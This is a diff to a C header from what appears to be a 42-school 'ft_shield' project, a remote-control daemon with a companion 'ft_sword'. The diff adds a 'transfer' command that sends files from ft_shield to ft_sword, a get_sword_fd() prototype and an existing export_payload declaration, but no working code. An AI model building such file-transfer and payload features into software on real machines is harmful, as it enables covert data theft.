@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/21 11:24:44 by mbatty            #+#    #+#             */
-/*   Updated: 2025/12/03 11:42:52 by mbatty           ###   ########.fr       */
+/*   Updated: 2025/12/04 09:45:57 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -19,6 +19,8 @@
 # include <fcntl.h>
 # include <time.h>
 # include <netdb.h>
+# include <unistd.h>
+# include <sys/file.h>
 
 # define SWORD_PORT	7003
 # define SWORD_IP	"0.0.0.0"
@@ -42,6 +44,7 @@
 quit: close ft_shield\n\
 help: see this\n\
 stats: see stats about the socket/users\n\
+transfer: transfer files from ft_shield to ft_sword\n\
 "				TEXT_RESET
 
 # define LOWERCASE_HEXA "0123456789abcdef"
@@ -93,9 +96,8 @@ void	disconnect_hook(t_client *client, void *ptr);
 void	handle_sig(int sig);
 
 uint32_t	hash_str(const char *input);
+int			get_sword_fd();
 
-const char	*logger_get_log_header(t_log_type type);
-void	logger_log_timestamp(int fd);
 void	logger_log(t_log_type type, char *str, ...);
 
 int		export_payload(bool root, char *src_path, char *dst_path);
